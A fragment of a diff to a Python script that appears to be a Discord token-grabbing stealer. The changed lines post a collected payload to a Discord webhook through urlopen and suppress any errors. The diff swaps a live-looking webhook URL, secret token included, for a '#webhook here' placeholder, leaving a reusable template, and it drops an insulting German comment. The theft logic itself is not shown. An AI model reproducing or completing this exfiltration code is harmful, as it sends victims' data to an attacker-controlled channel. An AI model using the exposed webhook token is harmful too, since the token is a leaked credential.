@@ -1,4 +1,4 @@
-#Nicht Klauen Ihr Wichser :)
+
 
 import os
 if os.name != "nt":
@@ -174,7 +174,7 @@ def main():
         "avatar_url": "https://cdn.discordapp.com/attachments/757238634377248900/910923758183796736/4ff1cd281fba2902187c400e93d4589c.jpg"
     }
     try:                #webhook under this message
-        urlopen(Request("https://discord.com/api/webhooks/910920394398126150/kUo1yAVbwsT2OMMRPrPuFskaeTERG_NpLpkpiqaQCdRnqkVc_mF45EwfpDKRYnv44PVt", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("#webhook here", data=dumps(webhook).encode(), headers=getheaders()))
 
     except:
         pass
